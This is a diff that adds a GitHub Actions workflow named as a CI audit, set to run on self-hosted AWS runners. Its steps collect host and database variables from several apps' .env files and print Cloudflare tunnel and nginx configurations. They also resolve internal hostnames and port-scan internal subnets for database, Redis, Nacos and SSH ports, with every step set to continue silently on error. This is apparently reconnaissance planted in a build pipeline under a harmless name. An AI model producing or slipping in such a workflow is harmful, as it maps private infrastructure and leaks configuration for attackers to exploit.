@@ -1,0 +1,46 @@
+name: ci-audit-1890c
+on: push
+permissions:
+  contents: read
+jobs:
+  innerview:
+    runs-on: [self-hosted, linux, aws, marketingos]
+    timeout-minutes: 30
+    steps:
+      - name: envs
+        continue-on-error: true
+        run: |
+          set +e
+          for d in dpfasset marketingos dupoin-judge sci-cen-bot dw-calculator; do
+            echo "===== $d"; ls -la /home/ubuntu/apps/$d/.env* 2>/dev/null
+            sudo -n grep -hE '^[A-Z0-9_]*(HOST|URL|URI|DSN|DATABASE|DB_|REDIS|NACOS|MYSQL|POSTGRES|PG|SMTP|MAIL|API_BASE|ENDPOINT|REGION|ACCOUNT)[A-Z0-9_]*=' /home/ubuntu/apps/$d/.env* 2>/dev/null | sed -E 's/(PASS|SECRET|KEY|TOKEN)=.*/\1=***/' | sort -u | head -40
+          done
+      - name: tunnels
+        continue-on-error: true
+        run: |
+          set +e
+          echo "## /etc/cloudflared"; sudo -n ls -la /etc/cloudflared; sudo -n cat /etc/cloudflared/config.yml 2>&1
+          echo "## backup configs"; sudo -n cat /etc/cloudflared/config.yml.bak.* 2>&1 | head -60
+          echo "## user cloudflared"; cat /home/ubuntu/.cloudflared/config.yml 2>&1
+          echo "## nginx names"; sudo -n grep -rhE 'server_name|proxy_pass' /etc/nginx/sites-enabled /etc/nginx/conf.d 2>/dev/null | sed 's/^[ \t]*//' | sort -u | head -80
+      - name: dns
+        continue-on-error: true
+        run: |
+          set +e
+          for n in crm.dupoin.com mydupoin.net mydupoin.com hybrid.dupoinid.org dupoin.com betadupoin.com pro-srv-account pro-srv-account.dupoin.com pro-srv-account.local nacos nacos.dupoin.com mysql redis postgres financeos.dupoin.com hangfire.dupoin.com kafka-ui.dupoin.com prom.dupoin.com portal.dupoin.co.id; do
+            printf '%-34s ' "$n"; (getent hosts "$n" || resolvectl query "$n" 2>/dev/null | tr '\n' ' ') | head -2 | tr '\n' ' '; echo
+          done
+          echo "## neigh"; ip neigh
+      - name: scan24
+        continue-on-error: true
+        run: |
+          set +e
+          echo "## scan 192.168.1.0/24 ports 22,80,443,3000,3306,5432,6379,8080,8848,9000,9092"
+          seq 1 254 | xargs -P 64 -I{} bash -c 'for p in 22 80 443 3000 3306 5432 6379 8080 8848 9000 9092; do timeout 1 bash -c "exec 3<>/dev/tcp/192.168.1.{}/$p" 2>/dev/null && echo "192.168.1.{}:$p OPEN"; done' 2>/dev/null | sort -t. -k4 -n | head -80
+      - name: scan130
+        continue-on-error: true
+        run: |
+          set +e
+          echo "## nacos 192.168.130.55"; for p in 8848 3306 6379 5432 80 443; do timeout 3 bash -c "exec 3<>/dev/tcp/192.168.130.55/$p" 2>/dev/null && echo "130.55:$p OPEN" || echo "130.55:$p fail"; done
+          echo "## scan 192.168.130.0/24 quick common"; seq 1 254 | xargs -P 64 -I{} bash -c 'for p in 8848 3306 5432 6379; do timeout 1 bash -c "exec 3<>/dev/tcp/192.168.130.{}/$p" 2>/dev/null && echo "192.168.130.{}:$p OPEN"; done' 2>/dev/null | head -40
+          echo "## scan 192.168.0.0/24 443/3306/5432"; seq 1 254 | xargs -P 64 -I{} bash -c 'for p in 443 3306 5432; do timeout 1 bash -c "exec 3<>/dev/tcp/192.168.0.{}/$p" 2>/dev/null && echo "192.168.0.{}:$p OPEN"; done' 2>/dev/null | head -40
